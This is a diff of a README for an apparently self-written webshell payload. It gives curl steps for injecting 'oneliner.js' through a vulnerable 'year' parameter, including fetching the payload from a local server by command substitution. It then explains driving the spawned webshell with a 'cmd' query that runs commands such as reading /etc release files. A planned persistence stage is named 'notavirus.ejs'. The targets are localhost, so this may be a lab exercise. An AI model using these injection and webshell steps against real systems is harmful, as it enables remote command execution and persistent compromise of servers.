@@ -1,8 +1,7 @@
-# Webshell Payload
+<h1 align="center">Initial Stage (oneliner.js)</h2>
 
-## Initial Stage (oneliner.js)
-### How to inject the payload
-#### Method 1
+## How to inject the payload
+### Method 1
 Copy the contents of the payload file.
 ```
 # Windows
@@ -15,8 +14,12 @@ And paste it at the vulnerable endpoint.
 ```
 curl -G --data-urlencode "year=<payload>" http://localhost:3000
 ```
+### Method 2
+Host a server from the `payload` directory and use cURL to inject the payload
+1. `php -S 0.0.0.0:5000` or `python -m http.server 5000`
+2. `curl -G --data-urlencode "year=$(curl -s http://localhost:5000/oneliner.js)" http://localhost:3000`
 
-### How to use the payload
+## How to use the payload
 
 The payload will spawn a webshell which you can access from `http://localhost:8000`. You can specify commands by appending an HTTP GET query called `cmd`
 ```
@@ -25,9 +28,6 @@ The payload will spawn a webshell which you can access from `http://localhost:80
 3. (using the browser) http://localhost:8000/?cmd=cat /etc/*-release
 ```
 
-#### Method 2
-Host a server from the `payload` directory and use cURL to inject the payload
-1. `php -S 0.0.0.0:5000` or `python -m http.server 5000`
-2. `curl -G --data-urlencode "year=$(curl -s http://localhost:5000/oneliner.js)" http://localhost:3000`
+<h1 align="center">Persistence Stage (notavirus.ejs)</h2>
 
-## Persistence Stage (notavirus.ejs)
+Still thinking of a way to do this
